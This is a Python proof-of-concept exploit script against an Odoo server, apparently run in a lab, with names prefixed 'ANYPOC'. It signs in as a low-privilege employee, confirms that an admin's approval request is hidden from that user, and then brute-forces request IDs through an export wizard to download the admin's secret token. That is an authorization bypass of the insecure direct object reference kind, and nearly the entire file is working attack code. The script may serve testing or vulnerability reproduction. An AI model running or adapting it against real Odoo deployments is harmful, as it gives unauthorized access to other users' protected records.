#!/usr/bin/env python3
import json
import os
import sys
from pathlib import Path
from urllib.parse import urljoin

import requests


BASE_URL = os.environ.get("ODOO_URL", "http://127.0.0.1:8069")
DB_NAME = os.environ.get("ODOO_DB", "anypoc_odoo")
LOGIN = os.environ.get("ODOO_LOGIN", "employee@lab.local")
PASSWORD = os.environ.get("ODOO_PASSWORD", "employeepass")
OUTPUT_DIR = Path(os.environ.get("POC_OUT_DIR", "/tmp/odoo_probe"))
MAX_REQUEST_ID = int(os.environ.get("MAX_REQUEST_ID", "20"))

ADMIN_NAME = "ANYPOC Admin Approval"
ADMIN_SECRET = "ANYPOC-APPROVAL-SECRET-9f4b3c"
EMPLOYEE_DECOY = "ANYPOC Employee Decoy"


def write_text(name: str, content: str) -> None:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    (OUTPUT_DIR / name).write_text(content, encoding="utf-8")


def dump_json(name: str, payload) -> None:
    write_text(name, json.dumps(payload, indent=2, sort_keys=True))


class OdooClient:
    def __init__(self) -> None:
        self.session = requests.Session()
        self.context = {}
        self.step = 0

    def _next(self, prefix: str, suffix: str) -> str:
        self.step += 1
        return f"{self.step:02d}_{prefix}.{suffix}"

    def authenticate(self) -> dict:
        payload = {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "db": DB_NAME,
                "login": LOGIN,
                "password": PASSWORD,
            },
        }
        response = self.session.post(
            urljoin(BASE_URL, "/web/session/authenticate"),
            json=payload,
            timeout=30,
        )
        write_text(self._next("authenticate_request", "json"), json.dumps(payload, indent=2))
        write_text(self._next("authenticate_response", "json"), response.text)
        response.raise_for_status()
        data = response.json()
        if data.get("error"):
            raise RuntimeError(f"authentication failed: {data['error']}")
        result = data["result"]
        self.context = result.get("user_context", {})
        return result

    def get_session_info(self) -> dict:
        payload = {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {},
        }
        response = self.session.post(
            urljoin(BASE_URL, "/web/session/get_session_info"),
            json=payload,
            timeout=30,
        )
        write_text(self._next("session_info_request", "json"), json.dumps(payload, indent=2))
        write_text(self._next("session_info_response", "json"), response.text)
        response.raise_for_status()
        data = response.json()
        if data.get("error"):
            raise RuntimeError(f"session info failed: {data['error']}")
        return data["result"]

    def call_kw(self, model: str, method: str, args, kwargs=None) -> dict:
        if kwargs is None:
            kwargs = {}
        kwargs.setdefault("context", self.context)
        payload = {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "model": model,
                "method": method,
                "args": args,
                "kwargs": kwargs,
            },
        }
        path = f"/web/dataset/call_kw/{model}/{method}"
        response = self.session.post(urljoin(BASE_URL, path), json=payload, timeout=30)
        dump_json(self._next(f"{model}_{method}_request", "json"), payload)
        write_text(self._next(f"{model}_{method}_response", "json"), response.text)
        response.raise_for_status()
        data = response.json()
        return data

    def download(self, relative_url: str, label: str) -> bytes:
        response = self.session.get(urljoin(BASE_URL, relative_url), timeout=30)
        write_text(self._next(f"{label}_headers", "txt"), str(response.headers))
        target_name = self._next(label, "bin")
        (OUTPUT_DIR / target_name).write_bytes(response.content)
        response.raise_for_status()
        return response.content


def normalize_create_result(result):
    if isinstance(result, list):
        if len(result) != 1:
            raise RuntimeError(f"unexpected create result list: {result!r}")
        return result[0]
    return result


def main() -> int:
    client = OdooClient()
    auth = client.authenticate()
    session_info = client.get_session_info()

    print(f"Authenticated uid={auth['uid']} login={LOGIN}")
    print(f"Session username={session_info.get('username')} name={session_info.get('name')}")

    employee_visible = client.call_kw(
        "anypoc.approval.request",
        "search_read",
        [[["name", "=", EMPLOYEE_DECOY]]],
        {"fields": ["id", "name", "owner_id", "secret_token"]},
    )
    admin_visible = client.call_kw(
        "anypoc.approval.request",
        "search_read",
        [[["name", "=", ADMIN_NAME]]],
        {"fields": ["id", "name", "owner_id", "secret_token"]},
    )

    employee_rows = employee_visible.get("result", [])
    admin_rows = admin_visible.get("result", [])
    dump_json("employee_visible.json", employee_rows)
    dump_json("admin_visible.json", admin_rows)

    if not employee_rows:
        raise RuntimeError("employee decoy request is not visible to employee session")
    if admin_rows:
        raise RuntimeError(f"admin request unexpectedly visible without exploit: {admin_rows!r}")

    print(f"Baseline: employee sees {len(employee_rows)} decoy request(s) and 0 admin requests")

    for candidate_id in range(1, MAX_REQUEST_ID + 1):
        create_data = client.call_kw(
            "anypoc.approval.export.wizard",
            "create",
            [{"target_request_id": candidate_id}],
        )
        if create_data.get("error"):
            print(f"create failed for candidate {candidate_id}: {create_data['error']}", file=sys.stderr)
            continue
        wizard_id = normalize_create_result(create_data["result"])

        action_data = client.call_kw(
            "anypoc.approval.export.wizard",
            "action_generate_export",
            [[wizard_id]],
        )
        if action_data.get("error"):
            print(f"export failed for candidate {candidate_id}: {action_data['error']}", file=sys.stderr)
            continue

        result = action_data["result"]
        download_url = result["url"]
        content = client.download(download_url, f"candidate_{candidate_id}_export")
        text = content.decode("utf-8", errors="replace")
        write_text(f"candidate_{candidate_id}_export.json", text)
        print(f"candidate {candidate_id}: downloaded {len(content)} bytes from {download_url}")

        if ADMIN_SECRET in text:
            print(f"SUCCESS: extracted admin secret via candidate request id {candidate_id}")
            print(text)
            write_text("SUCCESS.txt", f"candidate_id={candidate_id}\nurl={download_url}\n")
            return 0

    raise RuntimeError(f"failed to locate protected export within request id range 1..{MAX_REQUEST_ID}")


if __name__ == "__main__":
    sys.exit(main())
